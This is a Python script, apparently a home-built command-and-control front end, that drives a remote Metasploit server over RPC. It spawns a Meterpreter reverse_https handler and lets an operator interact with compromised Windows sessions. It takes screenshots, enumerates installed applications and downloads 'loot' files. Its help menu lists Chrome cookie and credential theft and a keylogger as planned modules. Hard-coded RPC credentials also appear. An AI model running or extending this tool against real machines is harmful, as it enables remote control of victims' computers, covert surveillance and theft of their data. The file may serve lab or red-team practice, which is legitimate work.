
from pymetasploit3.msfrpc import MsfRpcClient
from time import sleep
import base64

RPC_ADDRESS = '192.168.56.3'
RPC_PORT = '55553'
RPC_USER = 'admin'
RPC_PASS = 'hehehe'

client = MsfRpcClient(username=RPC_USER, password=RPC_PASS, server=RPC_ADDRESS, port=RPC_PORT, ssl=True)

#new console instance
console = client.call('console.create')
console_id = console["id"]

#len of the console list
console_check_1 = len(client.consoles.list)


#read intro console message, close if error:
result = client.call('console.read', [console_id])

if(result["data"]):
    print("[+] Console Spawned Successfully...")
else:
    print("[-] Error Spawning Console... Closing...")
    client.call('core.close')
    exit()


#Check for/Spawn handler
handler_check = False
if any("Exploit: multi/handler" in s for s in client.jobs.list.values()):
    print("[+] Handler Exists...")
    handler_check = True
else:
    print("[-] Handler Does Not Exist...")
    print("[+] Spawning windows/x64/meterpreter/reverse_https handler")
    print("[+] Listening on " + RPC_ADDRESS)

    client.call('console.write', [console_id, "use payload/windows/x64/meterpreter/reverse_https\r\n"])
    client.call('console.write', [console_id, "set LHOST " + RPC_ADDRESS + "\r\n"])
    client.call('console.write', [console_id, "exploit -j\r\n"])

sleep(1)
#Check for handler
if (handler_check):
    pass
elif any("Exploit: multi/handler" in s for s in client.jobs.list.values()):
    print("[+] Handler Spawned...")
else:
    print("[-] Error Spawning Handler... Closing...")
    client.call('core.close')
    exit()


#write to console format:
#
#result = client.call('console.write', [console_id, "show options\r\n"])
#print(result)
#
#result = client.call('console.read', [console_id])
#print(result["data"])
#


#Input loop:
print("\n[+] Remote Interactive C2 console:")
print("[+] Use command \"help\" for more information...")
try:
    while True:
        user_input = input("RPC >> ").lower()
        if user_input == 'help':
            print("""[+] Help Menu:
            
        -help : Show help menu
        -interactive: set the user into a directly interactive context with the remote metasploit framework console
            -exit: exits interactive mode (overloads exiting sessions interactively)
        -sessions:
            -no arg: lists sessions
            -i: sessions id to interact with
            -k: session id to kill
            (once interacting enter help again for session commands)
        -jobs:
            -no arg: lists jobs
            -k: job id to kill
        -loot:
            -no arg: lists the acquired loot!
            -g: Gets a Loot File! (writes to .\\loot\\)
                -args: the filename to retrieve
            -s: See the contents of a loot file (wont write)
            -d: delete ALL LOOT (will confirm)
        -consoles (mainly for debug/resource management):
            -no arg: lists active RPC consoles
            -k: console id to kill (can kill current rpc session)
            -killall: kill all consoles (terminates current rpc session)
        -exit: exits the interactive C2 console
""")
        
        elif "interactive" in user_input:
            
            try:
                while True:
                    user_input = input("Console ("+console_id+") >> ")
                    
                    if "exit" in user_input.lower():
                        if "-e" in user_input.lower():
                            client.call('console.write', [console_id, "exit\r\n"])
                            sleep(0.1)
                            result = client.call('console.read', [console_id])
                            print(result["data"])
                        else:
                            print("[-] Exiting Interactive Console Mode")
                            break
                    else:
                        client.call('console.write', [console_id, user_input + "\r\n"])
                        sleep(0.1)
                        result = client.call('console.read', [console_id])
                        print(result["data"])

            except KeyboardInterrupt:
                print("[-] Exiting Interactive Console Mode")

        elif "sessions" in user_input:
            if user_input == 'sessions':
                client.call('console.write', [console_id, "sessions\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            elif 'sessions -i ' in user_input:
                session_id = user_input.split('sessions -i ')[1]
                print("[+] Interacting with session " + session_id)
                client.call('console.write', [console_id, "sessions -i " + session_id + "\r\n"])
                
                result = client.call('console.read', [console_id])
                sessions_check = result["data"]
                if("Invalid session identifier" in sessions_check):
                    print("[-] Invalid Session")
                    continue
                
                try:
                    while True:
                        user_input = input("Session ("+session_id+") >> ").lower()
                        if user_input == 'help' or ('use' in user_input and ' -u' not in user_input):
                            print("""[+] Session Help Menu:
    -exit: backgrounds session (does not close use sessions -k)
    -interactive: direct interaction with the meterpreter console (exit to leave the interact context)
    -use:
        -no arg: this help menu
        -u: module to use on the session (available modules below)
            -applications: Grabs a list of the Users Applications
            -screenshot: Grabs a screenshot of the Sessions Screen
            -chrome-cookies: Gathers Chome Cookies (TODO)
            -chrome-creds: Gathers Chrome Credentials (TODO)
            -keylogger: (TODO)
            -TODO: Other Modules
""")
                        elif "interactive" in user_input:
                            user_input = input("Interact ("+session_id+") >> ").lower()
                            while user_input != "exit":
                                if "exit -e" in user_input:
                                    client.call('console.write', [console_id, "exit\r\n"])
                                    sleep(0.1)
                                    result = client.call('console.read', [console_id])
                                    print(result["data"])
                                else:
                                    client.call('console.write', [console_id, user_input + "\r\n"])
                                    sleep(.5)
                                    result = client.call('console.read', [console_id])
                                    print(result["data"])
                                    user_input = input("Interact ("+session_id+") >> ").lower()

                        elif "use -u " in user_input:
                            module = user_input.split("use -u ")[1]
                            if module == "chrome-cookies":
                                print("[+] Gathering Chrome Cookies...")
                                
                                #TODO: Implement

                                print("[+] Check loot...")
                            elif module == "applications":
                                print("[+] Gathering App List...")
            
                                client.call('console.write', [console_id, "run post/windows/gather/enum_applications\r\n"])
                                result = client.call('console.read', [console_id])
                                #print(result["data"])

                                print("[+] Check loot...")
                            elif module == "screenshot":
                                print("[+] Capturing Screenshot...")
                                
                                client.call('console.write', [console_id, "run post/windows/gather/screen_spy COUNT=1\r\n"])
                                result = client.call('console.read', [console_id])
                                #print(result["data"])

                                print("[+] Check loot...")

                            else:
                                print("[-] Invalid Module")


                        elif user_input == 'exit':
                            client.call('console.write', [console_id, "bg\r\n"])
                            print("\n[-] Backgrounding Session...")
                            break

                except KeyboardInterrupt:
                    client.call('console.write', [console_id, "bg\r\n"])
                    print("\n[-] Backgrounding Session...")


            elif 'sessions -k ' in user_input:
                session_id = user_input.split('sessions -k ')[1]
                print("[+] Killing session " + session_id)
                client.call('console.write', [console_id, "sessions -k " + session_id + "\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            else:
                print("[-] Unknown Args...")
        
        elif "jobs" in user_input:
            if user_input == 'jobs':
                client.call('console.write', [console_id, "jobs\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            elif 'jobs -k ' in user_input:
                job_id = user_input.split('jobs -k ')[1]
                print("[+] Killing Job " + job_id)
                client.call('console.write', [console_id, "jobs -k " + job_id + "\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            else:
                print("[-] Unknown Args...")

        elif "consoles" in user_input:
            if user_input == 'consoles':
                for elem in client.call('console.list')["consoles"]:
                    print("[+] Console: ID = " + elem['id'])

            elif 'consoles -k ' in user_input:
                c_id = user_input.split('consoles -k ')[1]
                client.call('console.destroy', [c_id])

                if(c_id == console_id):
                    print("[-] Exiting...")
                    exit()

            elif 'consoles -killall' in user_input:
                for elem in client.call('console.list')["consoles"]:
                    client.call('console.destroy', [elem['id']])
                
                print("[-] Exiting...")
                exit()

            else:
                print("[-] Unknown Args...")


        elif "loot" in user_input:
            if user_input == "loot":
                print("[+] Listing Loot...")
                client.call('console.write', [console_id, "loot\r\n"])
                sleep(0.1)
                result = client.call('console.read', [console_id])
                print(result["data"])

            elif user_input == "loot -d":
                user_input = input("ARE YOU SURE YOU WANT TO DELETE LOOT: [yes/no]: ").lower()
                if(user_input == "yes"):
                    print("[+] DELETING LOOT...")
                    client.call('console.write', [console_id, "loot -d\r\n"])
                    result = client.call('console.read', [console_id])
                    print(result["data"])

                else:
                    print("[+] No loot deleted")
                    continue

            elif "loot -g " in user_input or "loot -s " in user_input:
                
                if("-g" in user_input):
                    filename = user_input.split("loot -g ")[1]
                else:
                    filename = user_input.split("loot -s ")[1]
                if(filename.isspace() or filename == ""):
                    print("[-] Please enter a filename")
                    continue
                print("Filename : " + filename)

                client.call('console.write', [console_id, "loot\r\n"])
                result = client.call('console.read', [console_id])
                loot_data = result["data"].split("----")[-1].split("\n")

                loot_list = []
                file_found = False
                file_path = ""
                for elem in loot_data:
                    if elem != "":
                        if filename in elem:
                            file_found = True
                            file_path = elem.split()[-1]
                        loot_list.append(elem)

                #print(loot_list)
                #print("Found File?: " + str(file_found))
                if(file_found):
                    #print("File Path: " + file_path)
                    print("[+] Loot File Found!")

                    if("jpg" not in filename) and ("png" not in filename) and ("jpeg" not in filename):
                        client.call('console.write', [console_id, "cat " + file_path + "\r\n"])
                    else:
                        client.call('console.write', [console_id, "base64 " + file_path + "\r\n"])
                        
                    result = client.call('console.read', [console_id])
                    loot_content = result["data"]
                    

                    if("-g" in user_input):
                        print("[+] Writing to file: .\\loot\\" + filename)
                        new_file = open(".\\loot\\" + filename, "wb")

                        #get images vs normal data files
                        if("jpg" not in filename) and ("png" not in filename) and ("jpeg" not in filename):
                            new_file.write(loot_content.encode("utf-8"))
                        else:
                            loot_content = base64.b64decode(loot_content)
                            new_file.write(loot_content)

                        new_file.close()
                    else:
                        print(loot_content)
                else:
                    print("[-] File Not Found")


        elif user_input == 'exit':
            print("[-] Exiting...")
            break
except KeyboardInterrupt:
    print("\n[-] Exiting...")



#destroy console, check list length, and exit the connection
#client.consoles.destroy(console_id)
client.call('console.destroy', [console_id])
console_check_2 = len(client.consoles.list)

if((console_check_1 - 1) == console_check_2):
    print("[+] Console Successfully Killed... Closing.")
else:
    print("[-] Error Killing Console, Check RPC Resources!... Closing.")


client.call('core.close')
